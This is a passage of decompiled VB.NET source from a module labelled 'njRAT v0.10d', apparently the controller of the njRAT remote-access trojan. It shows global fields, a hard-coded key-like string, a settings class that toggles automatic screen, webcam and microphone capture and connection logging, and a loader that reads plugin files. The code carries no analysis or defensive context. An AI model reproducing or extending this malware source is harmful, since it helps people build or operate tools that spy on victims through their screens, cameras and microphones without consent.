		Public string_0 As String = "njRAT v0.10d"

		' Token: 0x04000377 RID: 887
		Public sk_0 As SK

		' Token: 0x04000378 RID: 888
		Public long_0 As Long = 0L

		' Token: 0x04000379 RID: 889
		Public long_1 As Long = 0L

		' Token: 0x0400037A RID: 890
		Public string_1 As String = "Y262SUCZ4UJJ"

		' Token: 0x0400037B RID: 891
		Public form1_0 As Form1

		' Token: 0x0400037C RID: 892
		Public int_0 As Integer = 1

		' Token: 0x0400037D RID: 893
		Public int_1 As Integer = 2

		' Token: 0x0400037E RID: 894
		Public int_2 As Integer = 3

		' Token: 0x0400037F RID: 895
		Public int_3 As Integer = 4

		' Token: 0x04000380 RID: 896
		Public int_4 As Integer = 5

		' Token: 0x04000381 RID: 897
		Public int_5 As Integer = 6

		' Token: 0x04000382 RID: 898
		Public int_6 As Integer = 7

		' Token: 0x04000383 RID: 899
		Public int_7 As Integer = 8

		' Token: 0x04000384 RID: 900
		Public int_8 As Integer = 9

		' Token: 0x04000385 RID: 901
		Public int_9 As Integer = 10

		' Token: 0x04000386 RID: 902
		Public int_10 As Integer = 11

		' Token: 0x04000387 RID: 903
		Public int_11 As Integer = 12

		' Token: 0x04000388 RID: 904
		Public list_0 As List(Of String) = New List(Of String)()

		' Token: 0x04000389 RID: 905
		Public list_1 As List(Of Class7.Class9) = New List(Of Class7.Class9)()

		' Token: 0x0400038A RID: 906
		Public notf_0 As notf = New notf()

		' Token: 0x0400038B RID: 907
		Private list_2 As List(Of Client) = New List(Of Client)()

		' Token: 0x0400038C RID: 908
		Public gclass3_0 As GClass3 = New GClass3(Application.StartupPath + "\GeoIP.dat", 1)

		' Token: 0x0400038D RID: 909
		Public waveOut_0 As WaveOut

		' Token: 0x0400038E RID: 910
		Public waveOut_1 As WaveOut

		' Token: 0x0400038F RID: 911
		Public bool_0 As Boolean = True

		' Token: 0x02000046 RID: 70
		Public NotInheritable Class Class8
			' Token: 0x06000734 RID: 1844 RVA: 0x000020D7 File Offset: 0x000002D7
			<DebuggerNonUserCode()>
			Public Sub New()
			End Sub

			' Token: 0x06000735 RID: 1845 RVA: 0x0003EAF4 File Offset: 0x0003CCF4
			Public Sub method_0()
				Me.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"))
				Me.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"))
				Me.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"))
				Me.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"))
				Me.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"))
				Me.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"))
				Me.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"))
				Me.string_0 = Class6.smethod_2("SCI", "5")
				Me.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"))
				Me.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"))
				Me.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"))
				Me.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"))
				Me.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"))
			End Sub

			' Token: 0x06000736 RID: 1846 RVA: 0x0003EC50 File Offset: 0x0003CE50
			Public Sub method_1()
				Class6.smethod_3("ShowAlert", Me.bool_0.ToString())
				Class6.smethod_3("LOGLOGIN", Me.bool_1.ToString())
				Class6.smethod_3("LOGCONNECTIONS", Me.bool_2.ToString())
				Class6.smethod_3("LOGLERR", Me.bool_3.ToString())
				Class6.smethod_3("LOGRERR", Me.bool_4.ToString())
				Class6.smethod_3("LOGMSGS", Me.bool_5.ToString())
				Class6.smethod_3("SCAUT", Me.bool_6.ToString())
				Class6.smethod_3("SCI", Me.string_0.ToString())
				Class6.smethod_3("CAMAUT", Me.bool_7.ToString())
				Class6.smethod_3("CAMI", Me.int_0.ToString())
				Class6.smethod_3("MICAUT", Me.bool_8.ToString())
				Class6.smethod_3("MICI", Me.int_1.ToString())
				Class6.smethod_3("scri", Me.int_2.ToString())
			End Sub

			' Token: 0x04000390 RID: 912
			Public bool_0 As Boolean

			' Token: 0x04000391 RID: 913
			Public bool_1 As Boolean

			' Token: 0x04000392 RID: 914
			Public bool_2 As Boolean

			' Token: 0x04000393 RID: 915
			Public bool_3 As Boolean

			' Token: 0x04000394 RID: 916
			Public bool_4 As Boolean

			' Token: 0x04000395 RID: 917
			Public bool_5 As Boolean

			' Token: 0x04000396 RID: 918
			Public bool_6 As Boolean

			' Token: 0x04000397 RID: 919
			Public string_0 As String

			' Token: 0x04000398 RID: 920
			Public bool_7 As Boolean

			' Token: 0x04000399 RID: 921
			Public int_0 As Integer

			' Token: 0x0400039A RID: 922
			Public bool_8 As Boolean

			' Token: 0x0400039B RID: 923
			Public int_1 As Integer

			' Token: 0x0400039C RID: 924
			Public int_2 As Integer
		End Class

		' Token: 0x02000047 RID: 71
		Public NotInheritable Class Class9
			' Token: 0x06000737 RID: 1847 RVA: 0x0003ED70 File Offset: 0x0003CF70
			Public Sub New(string_2 As String)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\plugin\" + string_2)
				Dim flag As Boolean = True
				Me.byte_0 = Class6.smethod_8(array, flag)
				Me.string_0 = string_2
				Me.string_1 = Class6.smethod_5(Me.byte_0)
			End Sub

			' Token: 0x0400039D RID: 925
			Public byte_0 As Byte()

			' Token: 0x0400039E RID: 926
			Public string_0 As String

			' Token: 0x0400039F RID: 927
			Public string_1 As String
		End Class

		' Token: 0x02000048 RID: 72
		' (Invoke) Token: 0x0600073B RID: 1851
		Public Delegate Sub Delegate0(object_0 As Object)
	End Module
End Namespace
